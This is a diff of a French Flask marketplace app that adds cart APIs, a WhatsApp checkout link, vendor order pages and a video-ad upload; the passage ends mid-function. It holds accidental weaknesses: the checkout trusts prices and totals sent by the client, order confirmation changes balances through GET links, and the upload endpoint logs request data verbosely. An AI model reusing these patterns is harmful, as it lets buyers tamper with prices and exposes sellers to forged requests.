-    article = ArticlePanier.query.get(article_id)
-    if not article:
-        return jsonify({"success": False, "message": "Article introuvable"}), 404
+def api_supprimer_article_panier(article_id):
+    """Supprimer un article du panier"""
+    article = ArticlePanier.query.get_or_404(article_id)
+    panier, _ = get_or_create_panier()
+    
+    # Vérifier que l'article appartient au panier courant
+    if article.panier_id != panier.id:
+        return jsonify({"success": False, "message": "Article non trouvé dans le panier"}), 404
     
     db.session.delete(article)
     db.session.commit()
     
-    return jsonify({"success": True, "message": "Article supprimé"})
+    return jsonify({
+        "success": True,
+        "message": "Article supprimé du panier",
+        "item_count": panier.get_item_count()
+    })
 
 
 @app.route("/api/panier/clear", methods=["POST"])
-def api_vider_panier():
-    """API: Vider le panier"""
-    panier, user = get_or_create_panier()
+def api_clear_panier():
+    """Vider complètement le panier"""
+    panier, _ = get_or_create_panier()
+    
+    # Supprimer tous les articles
     ArticlePanier.query.filter_by(panier_id=panier.id).delete()
     db.session.commit()
     
-    return jsonify({"success": True, "message": "Panier vidé"})
+    return jsonify({
+        "success": True,
+        "message": "Panier vidé"
+    })
+
+
+@app.route("/api/panier/count", methods=["GET"])
+def api_panier_count():
+    """Récupérer le nombre d'articles dans le panier (pour le badge)"""
+    panier, _ = get_or_create_panier()
+    return jsonify({
+        "count": panier.get_item_count()
+    })
+
+
+@app.route("/api/panier/checkout-whatsapp", methods=["POST"])
+def api_checkout_whatsapp():
+    """Créer une commande et générer un lien WhatsApp pour contacter le vendeur"""
+    data = request.get_json()
+    
+    if not data:
+        return jsonify({"success": False, "message": "Données invalides"}), 400
+    
+    articles = data.get("articles", [])
+    total = data.get("total", 0)
+    nom = data.get("nom", "").strip()
+    telephone = data.get("telephone", "").strip()
+    adresse = data.get("adresse", "").strip()
+    ville = data.get("ville", "").strip()
+    
+    # Validation
+    if not articles or not nom or not telephone or not adresse or not ville:
+        return jsonify({"success": False, "message": "Tous les champs sont obligatoires"}), 400
+    
+    # Nettoyer le numéro de téléphone
+    telephone = telephone.replace(" ", "").replace("-", "").replace(".", "")
+    
+    # Calculer les frais de livraison
+    frais_livraison = 0 if total > 50000 else 2000
+    grand_total = total + frais_livraison
+    
+    # Récupérer le panier et le premier article pour trouver le vendeur
+    panier, _ = get_or_create_panier()
+    premier_article_panier = panier.articles.first()
+    
+    if not premier_article_panier:
+        return jsonify({"success": False, "message": "Panier vide"}), 400
+    
+    # Trouver la boutique et le vendeur
+    produit = premier_article_panier.produit
+    boutique = produit.boutique
+    vendeur = boutique.proprietaire
+    
+    # Utiliser d'abord le numéro WhatsApp de la boutique, sinon le phone du vendeur
+    whatsapp_number = boutique.whatsapp or vendeur.phone
+    
+    # Vérifier que le vendeur a un numéro WhatsApp
+    vendeur_phone = whatsapp_number.replace("+", "").replace(" ", "").replace("-", "")
+    if not vendeur_phone:
+        return jsonify({"success": False, "message": "Le vendeur n'a pas configuré son numéro WhatsApp"}), 400
+    
+    # Ajouter l'indicatif si nécessaire (pour les numéros qui ne commencent pas par un indicatif connu)
+    if not vendeur_phone.startswith("225") and not vendeur_phone.startswith("237") and not vendeur_phone.startswith("226") and not vendeur_phone.startswith("229") and not vendeur_phone.startswith("228") and not vendeur_phone.startswith("243") and not vendeur_phone.startswith("242") and not vendeur_phone.startswith("241") and not vendeur_phone.startswith("256"):
+        vendeur_phone = "225" + vendeur_phone  # Défaut Côte d'Ivoire
+    
+    # Créer la commande
+    reference = f"CMD-{uuid.uuid4().hex[:8].upper()}"
+    
+    nouvelle_commande = Commande(
+        user_id=get_logged_in_user().id if get_logged_in_user() else None,
+        boutique_id=boutique.id,
+        reference=reference,
+        statut="en_attente",
+        total=grand_total,
+        frais_livraison=frais_livraison,
+        adresse_livraison=f"{adresse}, {ville}",
+        telephone_livraison=telephone,
+        notes=f"Nom: {nom}"
+    )
+    
+    db.session.add(nouvelle_commande)
+    db.session.flush()
+    
+    # Ajouter les articles à la commande
+    for article_data in articles:
+        produit = Produit.query.get(article_data.get("produit_id"))
+        if produit:
+            article_commande = ArticleCommande(
+                commande_id=nouvelle_commande.id,
+                produit_id=produit.id,
+                quantite=article_data.get("quantite", 1),
+                prix_unitaire=article_data.get("prix", produit.prix)
+            )
+            db.session.add(article_commande)
+    
+    db.session.commit()
+    
+    # Générer le message WhatsApp
+    articles_text = ""
+    for article_data in articles:
+        articles_text += f"• {article_data.get('nom', 'Produit')} x{article_data.get('quantite', 1)} - {int(article_data.get('prix', 0) * article_data.get('quantite', 1))} XOF\n"
+    
+    message = f"""🛒 *NOUVELLE COMMANDE* - #{reference}
+
+📦 *ARTICLES :*
+{articles_text}
+💰 *TOTAL :* {int(grand_total)} XOF
+
+📍 *LIVRAISON :*
+Nom: {nom}
+Tél: {telephone}
+Adresse: {adresse}, {ville}
+
+Merci de confirmer cette commande."""
+    
+    # Encoder le message pour l'URL
+    from urllib.parse import quote
+    message_encoded = quote(message)
+    
+    # Vider le panier
+    ArticlePanier.query.filter_by(panier_id=panier.id).delete()
+    db.session.commit()
+    
+    # Générer le lien WhatsApp
+    whatsapp_url = f"https://wa.me/{vendeur_phone}?text={message_encoded}"
+    
+    return jsonify({
+        "success": True,
+        "whatsapp_url": whatsapp_url,
+        "reference": reference
+    })
+
+
+@app.route("/cart")
+def cart_page():
+    """Page panier"""
+    user = get_logged_in_user()
+    return render_template("cart.html", user=user)
 
 
 # ==============================
-# 💳 SYSTEME DE PAIEMENT - ROUTES
+# 💳 SYSTEME DE PAIEMENT COMPLET
 # ==============================
 
 @app.route("/checkout", methods=["GET", "POST"])
@@ -4235,42 +4742,52 @@ def checkout_page():
         flash("Votre panier est vide.", "warning")
         return redirect(url_for("cart_page"))
     
+    # Calculer le total
     total = panier.get_total()
     frais_livraison = 0 if total > 50000 else 2000
     grand_total = total + frais_livraison
     
     if request.method == "POST":
+        # Récupérer les données du formulaire
         nom_complet = request.form.get("nom_complet", "").strip()
         email = request.form.get("email", "").strip()
         telephone = request.form.get("telephone", "").strip()
         indicatif = request.form.get("indicatif", "+225").strip()
         adresse = request.form.get("adresse", "").strip()
         ville = request.form.get("ville", "").strip()
-        payment_method = request.form.get("payment_method", "").strip()
         
-        if not all([nom_complet, email, telephone, adresse, ville, payment_method]):
+        # Validation
+        if not all([nom_complet, email, telephone, adresse, ville]):
             flash("Tous les champs sont obligatoires.", "danger")
             return render_template("checkout.html", 
-                user=user, panier=panier, total=total, 
-                frais_livraison=frais_livraison, grand_total=grand_total)
+                user=user, 
+                panier=panier, 
+                total=total, 
+                frais_livraison=frais_livraison,
+                grand_total=grand_total)
         
+        # Nettoyer le numéro
         telephone = telephone.replace(" ", "").replace("-", "").replace(".", "")
         numero_complet = indicatif + telephone
         
+        # Créer la commande
         reference = f"CMD-{uuid.uuid4().hex[:8].upper()}"
         
+        # Déterminer la boutique (prendre la première pour simplifier)
         premier_article = panier.articles.first()
         if not premier_article:
             flash("Panier vide.", "danger")
             return redirect(url_for("cart_page"))
         
         boutique = premier_article.produit.boutique
+        vendeur = boutique.proprietaire
         
+        # Sauvegarder la commande en statut "en_attente"
         nouvelle_commande = Commande(
             user_id=user.id if user else None,
             boutique_id=boutique.id,
             reference=reference,
-            statut="en_attente_paiement",
+            statut="en_attente",
             total=grand_total,
             frais_livraison=frais_livraison,
             adresse_livraison=f"{adresse}, {ville}",
@@ -4281,6 +4798,7 @@ def checkout_page():
         db.session.add(nouvelle_commande)
         db.session.flush()
         
+        # Ajouter les articles à la commande
         for article in panier.articles:
             produit = article.produit
             prix_actuel = produit.prix_promo if (produit.prix_promo and produit.prix_promo < produit.prix) else produit.prix
@@ -4294,22 +4812,130 @@ def checkout_page():
         
         db.session.commit()
         
-        return initier_paiement_soleaspay(nouvelle_commande, numero_complet, grand_total, email, nom_complet, payment_method)
+        # Générer le message WhatsApp pour le vendeur
+        articles_text = ""
+        for article in panier.articles:
+            prix = article.produit.prix_promo if (article.produit.prix_promo and article.produit.prix_promo < article.produit.prix) else article.produit.prix
+            articles_text += f"• {article.produit.nom} x{article.quantite} - {int(prix * article.quantite)} XOF\n"
+        
+        message = f"""🛒 *NOUVELLE COMMANDE* - #{reference}
+
+📦 *ARTICLES :*
+{articles_text}
+💰 *TOTAL :* {int(grand_total)} XOF
+
+📍 *LIVRAISON :*
+Nom: {nom_complet}
+Tél: {numero_complet}
+Adresse: {adresse}, {ville}
+Email: {email}
+
+Merci de confirmer cette commande."""
+        
+        # Encoder le message pour l'URL
+        from urllib.parse import quote
+        message_encoded = quote(message)
+        
+        # Numéro WhatsApp du vendeur (à adapter selon le pays)
+        vendeur_phone = vendeur.phone.replace("+", "").replace(" ", "").replace("-", "")
+        if not vendeur_phone.startswith("225") and not vendeur_phone.startswith("237"):
+            vendeur_phone = "225" + vendeur_phone  # Défaut Côte d'Ivoire
+        
+        # Vider le panier
+        ArticlePanier.query.filter_by(panier_id=panier.id).delete()
+        db.session.commit()
+        
+        # Rediriger vers WhatsApp
+        whatsapp_url = f"https://wa.me/{vendeur_phone}?text={message_encoded}"
+        flash("Commande créée avec succès ! Vous allez être redirigé vers WhatsApp.", "success")
+        return redirect(whatsapp_url)
+    
+    # Configuration des pays et services de paiement
+    countries = {
+        "Cameroun": "CM",
+        "Cameroon": "CM",
+        "Côte d'Ivoire": "CI",
+        "Cote d Ivoire": "CI",
+        "Ivory Coast": "CI",
+        "Burkina Faso": "BF",
+        "Bénin": "BJ",
+        "Benin": "BJ",
+        "Togo": "TG",
+        "Congo DRC": "COD",
+        "RDC": "COD",
+        "République Démocratique du Congo": "COD",
+        "Congo": "COG",
+        "Congo Brazzaville": "COG",
+        "Gabon": "GAB",
+        "Uganda": "UGA",
+    }
+    
+    services = {
+        "CM": [
+            {"id": 1, "name": "MOMO CM", "description": "MTN MOBILE MONEY CAMEROUN"},
+            {"id": 2, "name": "OM CM", "description": "ORANGE MONEY CAMEROUN"},
+        ],
+        "CI": [
+            {"id": 29, "name": "OM CI", "description": "ORANGE MONEY COTE D'IVOIRE"},
+            {"id": 30, "name": "MOMO CI", "description": "MTN MONEY COTE D'IVOIRE"},
+            {"id": 31, "name": "MOOV CI", "description": "MOOV COTE D'IVOIRE"},
+            {"id": 32, "name": "WAVE CI", "description": "WAVE COTE D'IVOIRE"},
+        ],
+        "BF": [
+            {"id": 33, "name": "MOOV BF", "description": "MOOV BURKINA FASO"},
+            {"id": 34, "name": "OM BF", "description": "ORANGE MONEY BURKINA FASO"},
+        ],
+        "BJ": [
+            {"id": 35, "name": "MOMO BJ", "description": "MTN MONEY BENIN"},
+            {"id": 36, "name": "MOOV BJ", "description": "MOOV BENIN"},
+        ],
+        "TG": [
+            {"id": 37, "name": "T-MONEY TG", "description": "T-MONEY TOGO"},
+            {"id": 38, "name": "MOOV TG", "description": "MOOV TOGO"},
+        ],
+        "COD": [
+            {"id": 52, "name": "VODACOM COD", "description": "VODACOM CONGO DRC"},
+            {"id": 53, "name": "AIRTEL COD", "description": "AIRTEL CONGO DRC"},
+            {"id": 54, "name": "ORANGE COD", "description": "ORANGE CONGO DRC"},
+        ],
+        "COG": [
+            {"id": 55, "name": "AIRTEL COG", "description": "AIRTEL CONGO"},
+            {"id": 56, "name": "MOMO COG", "description": "MTN MOMO CONGO"},
+        ],
+        "GAB": [
+            {"id": 57, "name": "AIRTEL GAB", "description": "AIRTEL GABON"},
+        ],
+        "UGA": [
+            {"id": 58, "name": "AIRTEL UGA", "description": "AIRTEL UGANDA"},
+            {"id": 59, "name": "MOMO UGA", "description": "MTN MOMO UGANDA"},
+        ],
+    }
     
     return render_template("checkout.html", 
-        user=user, panier=panier, total=total, 
-        frais_livraison=frais_livraison, grand_total=grand_total)
+        user=user, 
+        panier=panier, 
+        total=total, 
+        frais_livraison=frais_livraison,
+        grand_total=grand_total,
+        countries=countries,
+        countries_json=countries,
+        services_json=services)
 
 
 def initier_paiement_soleaspay(commande, telephone, montant, email, nom, payment_method_str):
     """Initie le paiement via SoleasPay"""
+    # Mapping des services de paiement
     service_map = {
-        "momo": 1, "om": 2, "wave": 32,
-        "momo_ci": 30, "om_ci": 29,
+        "momo": 1,  # MTN Mobile Money
+        "om": 2,    # Orange Money
+        "wave": 32, # Wave
+        "momo_ci": 30,  # MTN CI
+        "om_ci": 29,    # Orange CI
     }
     
     service_id = service_map.get(payment_method_str, 1)
     
+    # Payload pour SoleasPay
     payload = {
         "wallet": telephone,
         "amount": montant,
@@ -4339,6 +4965,7 @@ def initier_paiement_soleaspay(commande, telephone, montant, email, nom, payment
         result = response.json()
         
         if result.get("succès") or result.get("success"):
+            # Rediriger vers la page de confirmation SoleasPay
             payment_url = result.get("payment_url") or result.get("redirect_url")
             if payment_url:
                 return redirect(payment_url)
@@ -4363,6 +4990,7 @@ def paiement_succes():
         flash("Paramètres de paiement invalides.", "danger")
         return redirect(url_for("index_page"))
     
+    # Extraire l'ID de la commande
     try:
         commande_id = int(order_id.replace("NOVA-", ""))
     except:
@@ -4374,11 +5002,14 @@ def paiement_succes():
         flash("Commande introuvable.", "danger")
         return redirect(url_for("index_page"))
     
+    # Mettre à jour le statut
     commande.statut = "confirmee"
     db.session.commit()
     
+    # Traiter la commande (créditer le vendeur, etc.)
     traiter_commande_apres_paiement(commande)
     
+    # Vider le panier
     ArticlePanier.query.filter_by(panier_id=commande.user.paniers.first().id if commande.user else None).delete()
     db.session.commit()
     
@@ -4402,25 +5033,31 @@ def paiement_en_attente(commande_id):
 
 def traiter_commande_apres_paiement(commande):
     """Traite une commande après paiement confirmé"""
+    # 1. Créditer le vendeur
     boutique = commande.boutique
     vendeur = boutique.proprietaire
     
+    # Montant de la commande (moins les frais de livraison)
     montant_vente = commande.total - commande.frais_livraison
     
+    # Créditer le solde du vendeur
     vendeur.solde_revenu = (vendeur.solde_revenu or 0) + montant_vente
     vendeur.solde_parrainage = (vendeur.solde_parrainage or 0) + montant_vente
     
+    # 2. Mettre à jour les statistiques de ventes
     for article in commande.articles:
         produit = article.produit
         produit.ventes = (produit.ventes or 0) + article.quantite
         produit.quantite = max(0, (produit.quantite or 1) - article.quantite)
     
+    # 3. Envoyer notification email au vendeur
     envoyer_email_notification_vente(vendeur, commande)
     
+    # 4. Si l'acheteur a un parrain, calculer la commission
     if commande.user and commande.user.parrain:
         parrain = User.query.filter_by(username=commande.user.parrain).first()
         if parrain:
-            commission = montant_vente * 0.05
+            commission = montant_vente * 0.05  # 5% de commission
             parrain.solde_revenu = (parrain.solde_revenu or 0) + commission
             parrain.solde_parrainage = (parrain.solde_parrainage or 0) + commission
     
@@ -4433,17 +5070,10 @@ def envoyer_email_notification_vente(vendeur, commande):
         return
     
     try:
+        # Récupérer les détails de la commande
         articles_details = []
         for article in commande.articles:
             articles_details.append(f"{article.produit.nom} x{article.quantite} - {article.prix_unitaire * article.quantite} XOF")
-        
-        nom_client = "N/A"
-        email_client = "N/A"
-        if commande.notes:
-            if "Nom:" in commande.notes:
-                nom_client = commande.notes.split("Nom:")[1].split(",")[0]
-            if "Email:" in commande.notes:
-                email_client = commande.notes.split("Email:")[1].split(",")[0]
         
         html_content = f"""
         <h2>🎉 Nouvelle Vente !</h2>
@@ -4453,8 +5083,8 @@ def envoyer_email_notification_vente(vendeur, commande):
         <ul>
             <li><strong>Référence :</strong> {commande.reference}</li>
             <li><strong>Montant :</strong> {commande.total} XOF</li>
-            <li><strong>Client :</strong> {nom_client}</li>
-            <li><strong>Email :</strong> {email_client}</li>
+            <li><strong>Client :</strong> {commande.notes.split('Nom:')[1].split(',')[0] if 'Nom:' in (commande.notes or '') else 'N/A'}</li>
+            <li><strong>Email :</strong> {commande.notes.split('Email:')[1].split(',')[0] if 'Email:' in (commande.notes or '') else 'N/A'}</li>
             <li><strong>Téléphone :</strong> {commande.telephone_livraison}</li>
             <li><strong>Adresse :</strong> {commande.adresse_livraison}</li>
         </ul>
@@ -4465,8 +5095,11 @@ def envoyer_email_notification_vente(vendeur, commande):
         </ul>
         
         <p>Votre solde a été crédité de <strong>{commande.total - commande.frais_livraison} XOF</strong>.</p>
+        
+        <a href="{url_for('ma_boutique', boutique_id=commande.boutique.id, _external=True)}" style="display: inline-block; padding: 10px 20px; background: #3498db; color: white; text-decoration: none; border-radius: 5px;">Voir ma boutique</a>
         """
         
+        # Envoyer l'email via Resend ou Flask-Mail
         if API_KEY:
             requests.post(
                 "https://api.resend.com/emails",
@@ -4484,10 +5117,649 @@ def envoyer_email_notification_vente(vendeur, commande):
     except Exception as e:
         print(f"Erreur envoi email notification: {e}")
 
-
-@app.route("/cart")
-def cart_page():
-    """Page panier"""
+@app.route("/boutique/<int:boutique_id>/supprimer")
+@login_required
+def supprimer_boutique(boutique_id):
+    """Supprimer une boutique (désactivation logique)"""
+    boutique = Boutique.query.get_or_404(boutique_id)
     user = get_logged_in_user()
-    return render_template("cart.html", user=user)
 
+    # Vérifier que l'utilisateur est le propriétaire
+    if boutique.user_id != user.id:
+        flash("Accès refusé.", "danger")
+        return redirect(url_for("dashboard_page"))
+
+    # Désactiver la boutique (soft delete)
+    boutique.est_actif = False
+    db.session.commit()
+
+    flash("Boutique supprimée avec succès.", "success")
+    return redirect(url_for("dashboard_page"))
+
+
+@app.route("/boutiques")
+def liste_boutiques():
+    """Page publique pour voir toutes les boutiques"""
+    user = get_logged_in_user()
+    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(50).all()
+
+    return render_template("shop_public.html", boutiques=boutiques, user=user)
+
+
+@app.route("/market")
+def market_page():
+    """Page Market - Toutes les boutiques et produits récents"""
+    user = get_logged_in_user()
+    categorie_id = request.args.get("categorie", type=int)
+    
+    # Récupérer toutes les boutiques actives
+    boutiques = Boutique.query.filter_by(est_actif=True).order_by(Boutique.date_creation.desc()).limit(12).all()
+    
+    # Récupérer les produits récents (du plus récent au plus ancien)
+    query = Produit.query.filter_by(est_actif=True)
+    
+    if categorie_id:
+        query = query.filter_by(categorie_id=categorie_id)
+    
+    produits = query.order_by(Produit.date_creation.desc()).limit(24).all()
+    
+    # Récupérer toutes les catégories pour les filtres
+    categories = Categorie.query.order_by(Categorie.nom).all()
+    
+    return render_template("market.html",
+        boutiques=boutiques,
+        produits=produits,
+        categories=categories,
+        categorie_actuelle=categorie_id,
+        user=user
+    )
+
+
+# ==============================
+# 📦 GESTION DES COMMANDES POUR VENDEURS
+# ==============================
+
+@app.route("/boutique/<int:boutique_id>/commandes")
+@login_required
+def boutique_commandes(boutique_id):
+    """Page 'Mes commandes' - Voir les commandes en attente pour une boutique"""
+    boutique = Boutique.query.get_or_404(boutique_id)
+    user = get_logged_in_user()
+    
+    # Vérifier que l'utilisateur est le propriétaire
+    if boutique.user_id != user.id:
+        flash("Accès refusé.", "danger")
+        return redirect(url_for("dashboard_page"))
+    
+    # Récupérer les commandes en attente
+    commandes = Commande.query.filter_by(boutique_id=boutique.id, statut="en_attente").order_by(Commande.date_creation.desc()).all()
+    
+    return render_template("boutique_commandes.html",
+        boutique=boutique,
+        commandes=commandes,
+        user=user
+    )
+
+
+@app.route("/boutique/<int:boutique_id>/ventes")
+@login_required
+def boutique_ventes(boutique_id):
+    """Page 'Mes ventes' - Voir les commandes confirmées pour une boutique"""
+    boutique = Boutique.query.get_or_404(boutique_id)
+    user = get_logged_in_user()
+    
+    # Vérifier que l'utilisateur est le propriétaire
+    if boutique.user_id != user.id:
+        flash("Accès refusé.", "danger")
+        return redirect(url_for("dashboard_page"))
+    
+    # Récupérer les commandes confirmées
+    commandes = Commande.query.filter_by(boutique_id=boutique.id, statut="confirmee").order_by(Commande.date_creation.desc()).all()
+    
+    return render_template("boutique_ventes.html",
+        boutique=boutique,
+        commandes=commandes,
+        user=user
+    )
+
+
+# Routes alternatives sans boutique_id (pour accès direct depuis le dashboard)
+@app.route("/boutique/commandes")
+@login_required
+def voir_commandes_boutique():
+    """Page 'Mes commandes' - Voir toutes les commandes en attente de l'utilisateur"""
+    user = get_logged_in_user()
+    
+    # Récupérer toutes les boutiques de l'utilisateur
+    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
+    boutique_ids = [b.id for b in boutiques]
+    
+    if not boutique_ids:
+        flash("Vous n'avez pas de boutique active.", "warning")
+        return redirect(url_for("dashboard_page"))
+    
+    # Récupérer les commandes en attente de toutes les boutiques
+    commandes = Commande.query.filter(
+        Commande.boutique_id.in_(boutique_ids),
+        Commande.statut == "en_attente"
+    ).order_by(Commande.date_creation.desc()).all()
+    
+    return render_template("boutique_commandes.html",
+        boutique=boutiques[0] if len(boutiques) == 1 else None,
+        commandes=commandes,
+        user=user
+    )
+
+
+@app.route("/boutique/ventes")
+@login_required
+def voir_ventes_boutique():
+    """Page 'Mes ventes' - Voir toutes les ventes confirmées de l'utilisateur"""
+    user = get_logged_in_user()
+    
+    # Récupérer toutes les boutiques de l'utilisateur
+    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
+    boutique_ids = [b.id for b in boutiques]
+    
+    if not boutique_ids:
+        flash("Vous n'avez pas de boutique active.", "warning")
+        return redirect(url_for("dashboard_page"))
+    
+    # Récupérer les commandes confirmées de toutes les boutiques
+    commandes = Commande.query.filter(
+        Commande.boutique_id.in_(boutique_ids),
+        Commande.statut == "confirmee"
+    ).order_by(Commande.date_creation.desc()).all()
+    
+    return render_template("boutique_ventes.html",
+        boutique=boutiques[0] if len(boutiques) == 1 else None,
+        commandes=commandes,
+        user=user
+    )
+
+
+@app.route("/commande/<int:commande_id>/confirmer")
+@login_required
+def confirmer_commande(commande_id):
+    """Confirmer une commande (vendeur)"""
+    commande = Commande.query.get_or_404(commande_id)
+    boutique = commande.boutique
+    user = get_logged_in_user()
+    
+    # Vérifier que l'utilisateur est le propriétaire
+    if boutique.user_id != user.id:
+        flash("Accès refusé.", "danger")
+        return redirect(url_for("dashboard_page"))
+    
+    if commande.statut != "en_attente":
+        flash("Cette commande a déjà été traitée.", "warning")
+        return redirect(url_for("boutique_ventes", boutique_id=boutique.id))
+    
+    # Confirmer la commande
+    commande.statut = "confirmee"
+    commande.date_modification = datetime.utcnow()
+    
+    # Créditer le vendeur
+    montant_vente = commande.total - commande.frais_livraison
+    vendeur = boutique.proprietaire
+    vendeur.solde_revenu = (vendeur.solde_revenu or 0) + montant_vente
+    vendeur.solde_parrainage = (vendeur.solde_parrainage or 0) + montant_vente
+    
+    # Mettre à jour les statistiques de ventes
+    for article in commande.articles:
+        produit = article.produit
+        produit.ventes = (produit.ventes or 0) + article.quantite
+        produit.quantite = max(0, (produit.quantite or 1) - article.quantite)
+    
+    db.session.commit()
+    
+    flash(f"Commande #{commande.reference} confirmée avec succès !", "success")
+    return redirect(url_for("boutique_ventes", boutique_id=boutique.id))
+
+
+@app.route("/commande/<int:commande_id>/rejeter")
+@login_required
+def rejeter_commande(commande_id):
+    """Rejeter une commande (vendeur)"""
+    commande = Commande.query.get_or_404(commande_id)
+    boutique = commande.boutique
+    user = get_logged_in_user()
+    
+    # Vérifier que l'utilisateur est le propriétaire
+    if boutique.user_id != user.id:
+        flash("Accès refusé.", "danger")
+        return redirect(url_for("dashboard_page"))
+    
+    if commande.statut != "en_attente":
+        flash("Cette commande a déjà été traitée.", "warning")
+        return redirect(url_for("boutique_commandes", boutique_id=boutique.id))
+    
+    # Rejeter la commande
+    commande.statut = "annulee"
+    commande.date_modification = datetime.utcnow()
+    
+    # Remettre les produits en stock
+    for article in commande.articles:
+        produit = article.produit
+        produit.quantite = (produit.quantite or 0) + article.quantite
+    
+    db.session.commit()
+    
+    flash(f"Commande #{commande.reference} rejetée.", "info")
+    return redirect(url_for("boutique_commandes", boutique_id=boutique.id))
+
+
+# ==============================
+# 📹 ROUTES POUR LES PUBLICITÉS VIDEO (Style TikTok)
+# ==============================
+
+# Configuration upload vidéos
+UPLOAD_FOLDER_PUBLICITES = os.path.join(app.root_path, 'static', 'uploads', 'publicites')
+ALLOWED_VIDEO_EXTENSIONS = {'mp4', 'webm', 'mov', 'avi'}
+MAX_VIDEO_SIZE = 50 * 1024 * 1024  # 50MB
+
+def allowed_video(filename):
+    """Vérifie si l'extension du fichier vidéo est autorisée"""
+    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_VIDEO_EXTENSIONS
+
+
+@app.route("/publicites")
+def publicites_page():
+    """Page principale des publicités (style TikTok)"""
+    user = get_logged_in_user()
+    
+    # Récupérer les publicités actives, triées par date
+    publicites = Publicite.query.filter_by(est_actif=True).order_by(Publicite.date_creation.desc()).limit(20).all()
+    
+    return render_template("publicite.html", 
+        publicites=publicites, 
+        user=user)
+
+
+@app.route("/publicite/creer", methods=["GET", "POST"])
+@login_required
+def creer_publicite():
+    """Page pour créer une publicité vidéo - Réservé aux vendeurs"""
+    user = get_logged_in_user()
+    
+    # Vérifier si l'utilisateur a une boutique active
+    boutiques = Boutique.query.filter_by(user_id=user.id, est_actif=True).all()
+    
+    if not boutiques:
+        # L'utilisateur n'a pas de boutique, redirection vers la page de création de boutique
+        flash("Vous devez avoir une boutique pour créer une publicité.", "warning")
+        return redirect(url_for("creer_boutique"))
+    
+    # Récupérer les produits de l'utilisateur
+    produits = []
+    for boutique in boutiques:
+        produits.extend(Produit.query.filter_by(boutique_id=boutique.id, est_actif=True).all())
+    
+    return render_template("publicite_creer.html", 
+        user=user, 
+        produits=produits,
+        boutiques=boutiques)
+
+
+@app.route("/api/publicite/creer", methods=["POST"])
+@login_required
+def api_creer_publicite():
+    """API pour créer une publicité vidéo"""
+    print("=" * 60)
+    print("DEBUG UPLOAD PUBLICITE")
+    print("=" * 60)
+    
+    user = get_logged_in_user()
+    
+    # DEBUG: Afficher les fichiers et form data
+    print(f"request.files = {request.files}")
+    print(f"request.form = {request.form}")
+    
+    # Vérifier les fichiers
+    if 'video' not in request.files:
+        print("ERREUR: Aucune vidéo fournie")
+        return jsonify({"success": False, "message": "Aucune vidéo fournie"}), 400
+    
+    video_file = request.files['video']
+    
+    print(f"video_file = {video_file}")
+    print(f"video_file.filename = {video_file.filename}")
+    
+    if not video_file.filename:
+        print("ERREUR: Nom de fichier vide")
+        return jsonify({"success": False, "message": "Nom de fichier vide"}), 400
+    
+    if not allowed_video(video_file.filename):
+        print(f"ERREUR: Format non supporté - {video_file.filename}")
+        return jsonify({"success": False, "message": "Format vidéo non supporté"}), 400
+    
+    # Vérifier la taille
+    video_file.seek(0, os.SEEK_END)
+    size = video_file.tell()
+    video_file.seek(0)
+    
+    print(f"Taille vidéo = {size} octets ({size / 1024 / 1024:.2f} MB)")
+    
+    if size > MAX_VIDEO_SIZE:
+        print(f"ERREUR: Vidéo trop volumineuse - {size} > {MAX_VIDEO_SIZE}")
+        return jsonify({"success": False, "message": "Vidéo trop volumineuse (max 50MB)"}), 400
+    
+    # Récupérer les données du formulaire
+    titre = request.form.get('titre', '').strip()
+    description = request.form.get('description', '').strip()
+    prix = request.form.get('prix', type=float)
+    devise = request.form.get('devise', 'XOF')
+    produit_id = request.form.get('produit_id', type=int)
+    
+    print(f"titre = {titre}")
+    print(f"prix = {prix}")
+    print(f"devise = {devise}")
+    print(f"produit_id = {produit_id}")
+    
+    if not titre:
+        print("ERREUR: Le titre est obligatoire")
+        return jsonify({"success": False, "message": "Le titre est obligatoire"}), 400
+    
+    if not prix or prix < 0:
+        print("ERREUR: Le prix est obligatoire")
+        return jsonify({"success": False, "message": "Le prix est obligatoire"}), 400
+    
+    # Trouver la boutique et le produit
+    boutique = None
+    produit = None
+    
+    if produit_id:
+        produit = Produit.query.get(produit_id)
+        if produit:
+            boutique = produit.boutique
+            print(f"Produit trouvé: {produit.nom}")
+    
+    # Si pas de produit, prendre la première boutique de l'utilisateur
+    if not boutique:
+        boutique = Boutique.query.filter_by(user_id=user.id, est_actif=True).first()
+        print(f"Boutique trouvée: {boutique.nom if boutique else None}")
+    
+    if not boutique:
+        print("ERREUR: Vous devez avoir une boutique")
+        return jsonify({"success": False, "message": "Vous devez avoir une boutique pour créer une publicité"}), 400
+    
+    # Sauvegarder la vidéo
+    import uuid
+    ext = video_file.filename.rsplit('.', 1)[1].lower()
+    unique_filename = f"pub_{uuid.uuid4().hex[:8]}.{ext}"
+    video_path = os.path.join(UPLOAD_FOLDER_PUBLICITES, unique_filename)
+    
+    print(f"UPLOAD_FOLDER_PUBLICITES = {UPLOAD_FOLDER_PUBLICITES}")
+    print(f"video_path = {video_path}")
+    print(f"video_path existe deja = {os.path.exists(video_path)}")
+    
+    try:
+        # S'assurer que le dossier existe
+        os.makedirs(UPLOAD_FOLDER_PUBLICITES, exist_ok=True)
+        print(f"Dossier créé/vérifié: {UPLOAD_FOLDER_PUBLICITES}")
+        
+        # DEBUG: Logs détaillés avant écriture
+        print(f"video_path = {video_path}")
+        print(f"dirname = {os.path.dirname(video_path)}")
+        print(f"dirname exists = {os.path.exists(os.path.dirname(video_path))}")
+        print(f"dirname isdir = {os.path.isdir(os.path.dirname(video_path))}")
+        print(f"filename = {os.path.basename(video_path)}")
+        print(f"repr(video_path) = {repr(video_path)}")
+        print(f"len(video_path) = {len(video_path)}")
+        print(f"cwd = {os.getcwd()}")
+        print(f"dirname contents = {os.listdir(os.path.dirname(video_path))}")
+        
+        # TEST: Vérifier si on peut écrire un fichier test
+        test_file = os.path.join(UPLOAD_FOLDER_PUBLICITES, "test_write.txt")
+        try:
+            with open(test_file, "w") as f:
+                f.write("test")
+            print(f"test_file créé : {os.path.exists(test_file)}")
+        except Exception as e_test:
+            print(f"ERREUR test write: {e_test}")
+        
+        # Sauvegarder la vidéo
+        video_data = video_file.read()
+        with open(video_path, 'wb') as f:
+            f.write(video_data)
+        
+        print(f"Fichier sauvegardé: {video_path}")
+        print(f"Fichier existe apres sauvegarde = {os.path.exists(video_path)}")
+        print(f"Taille fichier sur disque = {os.path.getsize(video_path)} octets")
+        
